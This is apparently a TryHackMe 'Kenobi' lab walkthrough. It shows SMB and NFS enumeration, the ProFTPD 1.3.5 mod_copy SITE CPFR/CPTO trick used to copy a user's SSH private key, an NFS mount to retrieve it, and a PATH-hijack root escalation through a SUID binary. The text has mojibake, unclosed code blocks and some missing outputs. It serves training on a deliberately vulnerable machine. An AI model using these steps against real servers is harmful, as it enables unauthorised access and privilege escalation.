Hello every one. Today we'll solve an easy room on Try Hack Me. I'll be guiding you through each task given in the room. lettuce begin.

## Task 1 : Deploy the vulnerable machine
Just click on `Start Machine` button presented in this task. This shall get your server running. You'll get the ip address in a minute. Then connect to Try Hack Me vpn and try to ping the ip address to check if you can successfull access the server.

Now let's explore the open ports and services underlying using Nmap.
`nmap -sV <ip address>`

```bash
â”Œâ”€â”€(cyb3riticã‰¿kali)-[~]
â””â”€$ nmap -sV 10.10.107.130

```

**Q1. Scan the machine with nmap, how many ports are open?**
**Ans: `7`**

## Task 2 : Enumerating Samba for shares 

![samba](.medias/kenobi/samba.png)
Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

Using nmap we can enumerate a machine for SMB shares.

Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!

`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.107.130`

SMB has two ports, 445 and 139.

We can also enumerate the shares using `smbclient -L <ip address>`. and just hit `enter` when asked for password.

```bash
â”Œâ”€â”€(cyb3riticã‰¿kali)-[~]
â””â”€$ smbclient -L 10.10.107.130  
Password for [WORKGROUP\cyb3ritic]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment

        ---------            -------
        WORKGROUP            KENOBI
```

The share `anonymous` looks sus. Let's get into it.

```bash
â”Œâ”€â”€(cyb3riticã‰¿kali)-[~]
â””â”€$ smbclient \\\\10.10.107.130\\anonymous

- `ls` command listed all the files present in the anonymous share`
- found `log.txt`, which i felt may have some info. so I downloaded it using `get` command.
- - It seems to be a ***long*** file instead of ***log*** file ðŸ˜¬

# Sample configuration file for the Samba suite for Debian GNU/Linux.
#
#
# This is the main Samba configuration file. You should read the
# smb.conf(5) manual page in order to understand the options listed
# here. Samba has a huge number of configurable options most of which 
# are not shown in this example
#
# Some options that are often worth tuning have been included as
# commented-out examples in this file.
#  - When such options are commented with ";", the proposed setting
#    differs from the default Samba behaviour
#  - When commented with "#", the proposed setting is the default
#    behaviour of Samba but the option is considered important
#    enough to be mentioned here
#
# NOTE: Whenever you modify this file you should run the command
# "testparm" to check that you have not made any basic syntactic 
# errors. 

#======================= Global Settings =======================

[global]

## Browsing/Identification ###

# Change this to the workgroup/NT-domain name your Samba server will part of
   workgroup = WORKGROUP

# server string is the equivalent of the NT Description field
        server string = %h server (Samba, Ubuntu)

# Windows Internet Name Serving Support Section:
# WINS Support - Tells the NMBD component of Samba to enable its WINS Server
#   wins support = no

# WINS Server - Tells the NMBD components of Samba to be a WINS Client
# Note: Samba can be either a WINS Server, or a WINS Client, but NOT both
;   wins server = w.x.y.z

# This will prevent nmbd to search for NetBIOS names through DNS.
   dns proxy = no

#### Networking ####

# The specific set of interfaces / networks to bind to
# This can be either the interface name or an IP address/netmask;
# interface names are normally preferred
;   interfaces = 127.0.0.0/8 eth0

# Only bind to the named interfaces and/or networks; you must use the
# 'interfaces' option above to use this.
# It is recommended that you enable this feature if your Samba machine is
# not protected by a firewall or is a firewall itself.  However, this
# option cannot handle dynamic or non-broadcast interfaces correctly.
;   bind interfaces only = yes



#### Debugging/Accounting ####

# This tells Samba to use a separate log file for each machine
# that connects
   log file = /var/log/samba/log.%m

# Cap the size of the individual log files (in KiB).
   max log size = 1000

# If you want Samba to only log through syslog then set the following
# parameter to 'yes'.
#   syslog only = no

# We want Samba to log a minimum amount of information to syslog. Everything
# should go to /var/log/samba/log.{smbd,nmbd} instead. If you want to log
# through syslog you should set the following parameter to something higher.
   syslog = 0

# Do something sensible when Samba crashes: mail the admin a backtrace
   panic action = /usr/share/samba/panic-action %d


####### Authentication #######

# Server role. Defines in which mode Samba will operate. Possible
# values are "standalone server", "member server", "classic primary
# domain controller", "classic backup domain controller", "active
# directory domain controller". 
#
# Most people will want "standalone sever" or "member server".
# Running as "active directory domain controller" will require first
# running "samba-tool domain provision" to wipe databases and create a
# new domain.
   server role = standalone server

# If you are using encrypted passwords, Samba will need to know what
# password database type you are using.  
   passdb backend = tdbsam

   obey pam restrictions = yes

# This boolean parameter controls whether Samba attempts to sync the Unix
# password with the SMB password when the encrypted SMB password in the
# passdb is changed.
   unix password sync = yes

# For Unix password sync to work on a Debian GNU/Linux system, the following
# parameters must be set (thanks to Ian Kahan <<kahan@informatik.tu-muenchen.de> for
# sending the correct chat script for the passwd program in Debian Sarge).
   passwd program = /usr/bin/passwd %u
   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .

# This boolean controls whether PAM will be used for password changes
# when requested by an SMB client instead of the program listed in
# 'passwd program'. The default is 'no'.
   pam password change = yes

# This option controls how unsuccessful authentication attempts are mapped
# to anonymous connections
   map to guest = bad user

########## Domains ###########

#
# The following settings only takes effect if 'server role = primary
# classic domain controller', 'server role = backup domain controller'
# or 'domain logons' is set 
#

# It specifies the location of the user's
# profile directory from the client point of view) The following
# required a [profiles] share to be setup on the samba server (see
# below)
;   logon path = \\%N\profiles\%U
# Another common choice is storing the profile in the user's home directory
# (this is Samba's default)
#   logon path = \\%N\%U\profile

# The following setting only takes effect if 'domain logons' is set
# It specifies the location of a user's home directory (from the client
# point of view)
;   logon drive = H:
#   logon home = \\%N\%U

# The following setting only takes effect if 'domain logons' is set
# It specifies the script to run during logon. The script must be stored
# in the [netlogon] share
# NOTE: Must be store in 'DOS' file format convention
;   logon script = logon.cmd

# This allows Unix users to be created on the domain controller via the SAMR
# RPC pipe.  The example command creates a user account with a disabled Unix
# password; please adapt to your needs
; add user script = /usr/sbin/adduser --quiet --disabled-password --gecos "" %u

# This allows machine accounts to be created on the domain controller via the 
# SAMR RPC pipe.  
# The following assumes a "machines" group exists on the system
; add machine script  = /usr/sbin/useradd -g machines -c "%u machine account" -d /var/lib/samba -s /bin/false %u

# on a per machine basis. The %m gets replaced with the netbios name
# of the machine that is connecting

;   usershare max shares = 100

# Allow users who've been granted usershare privileges to create
# public shares, not just authenticated ones
   usershare allow guests = yes

#======================= Share Definitions =======================

# Un-comment the following (and tweak the other settings below to suit)
# to enable the default home directory shares. This will share each
# user's home directory as \\server\username
;[homes]
;   comment = Home Directories
;   browseable = no

# By default, the home directories are exported read-only. Change the

[anonymous]
   path = /home/kenobi/share
   browseable = yes
   read only = yes
   guest ok = yes

```

- but from first few lines, we can recoginze that it is related to ssh. 
- A key is generated and stored in .ssh folder of kenobi.
- Also we have some information about ftp running on 21.

So what can we do?? To get into the system, we need that ssh id.

**Q1. Using the nmap command above, how many shares have been found?**

```bash
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
```

**Ans: `3`**

**Q2. Once you're connected, list the files on the share. What is the file can you see?**

```bash
smb: \> ls
  .                                   D        0  Wed Sep  4 16:19:09 2019

  log.txt                             N    12237  Wed Sep  4 16:19:09 2019
```

**Ans: `log.txt`**

**Q4. What port is FTP running on?**

**Ans: `21`**

Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.107.130`

**Q5. What mount can we see?**

```bash
â”Œâ”€â”€(cyb3riticã‰¿kali)-[~]
â””â”€$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.107.130

## TASK 3 : Gain initial access with ProFtpd

Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.

**Q1. What is the version?**
```bash
â”Œâ”€â”€(cyb3riticã‰¿kali)-[~]
â””â”€$ nc 10.10.107.130 21 
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.107.130]

```
**Ans: `1.3.5`**

We can use searchsploit to find exploits for a particular software version.

Searchsploit is basically just a command line search tool for exploit-db.com.

**Q2. How many exploits are there for the ProFTPd running?**
```bash

**Ans: `4`**

You should have found an exploit from ProFtpd's `mod_copy` module. 

The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 

We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

```bash
â”Œâ”€â”€(cyb3riticã‰¿kali)-[~]
â””â”€$ nc 10.10.107.130 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.107.130]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/ssh_id
250 Copy successful
```
We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

Lets mount the /var/tmp directory to our machine

- `mkdir /mnt/kenobiNFS`
- `mount 10.10.107.130:/var /mnt/kenobiNFS`
- `ls -la /mnt/kenobiNFS`

We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.

```bash
â”Œâ”€â”€(cyb3riticã‰¿kali)-[/mnt/kenobiNFS/tmp]
â””â”€$ cp /mnt/kenobiNFS/tmp/ssh_id ~/Downloads
                                                                                                                                        
â”Œâ”€â”€(cyb3riticã‰¿kali)-[/mnt/kenobiNFS/tmp]
â””â”€$ cd ~/Downloads                          
                                                                                                                                        
â”Œâ”€â”€(cyb3riticã‰¿kali)-[~/Downloads]
â””â”€$ chmod 600 ssh_id
                                                                                                                                        
â”Œâ”€â”€(cyb3riticã‰¿kali)-[~/Downloads]
â””â”€$ ssh -i ssh_id kenobi@10.10.107.130

**Q4. What is Kenobi's user flag (/home/kenobi/user.txt)?**

## Task 4 : Privilege Escalation with path variable manipulation

![SUID](.medias/kenobi/SUID.png)

Lets first understand what what SUID, SGID and Sticky Bits are.

Permission|	On Files|	On Directories|
----------|---------|-----------------|
SUID Bit|	User executes the file with permissions of the file owner|	-|
SGID Bit|	User executes the file with the permission of the group owner.|File created in directory gets the same group owner.|
Sticky Bit|	No meaning|	Users are prevented from deleting files from other users.|


SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following: `find / -perm -u=s -type f 2>/dev/null`

**Q1. What file looks particularly out of the ordinary?** 
```text
The file /usr/bin/menu looks weird because it is not native to linux system. It must be created by someone.
```
**Ans: `/usr/bin/menu`**

**Q2. Run the binary, how many options appear?**

```bash
kenobi@kenobi:~$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :

```
**Ans: `3`**

Strings is a command on Linux that looks for human readable strings on a binary.
![disecting menu binary](.medias/kenobi/disect_binary.png)

This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

let's the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This means that when the /usr/bin/menu binary is run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it will run our shell as root!

```bash
kenobi@kenobi:~$ echo /bin/sh > /tmp/curl
kenobi@kenobi:~$ chmod 777 /tmp/curl
kenobi@kenobi:~$ export PATH=/tmp:$PATH
kenobi@kenobi:~$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# 
```

So we are root. Now we can simply grab the root flag by traversing to root directory.
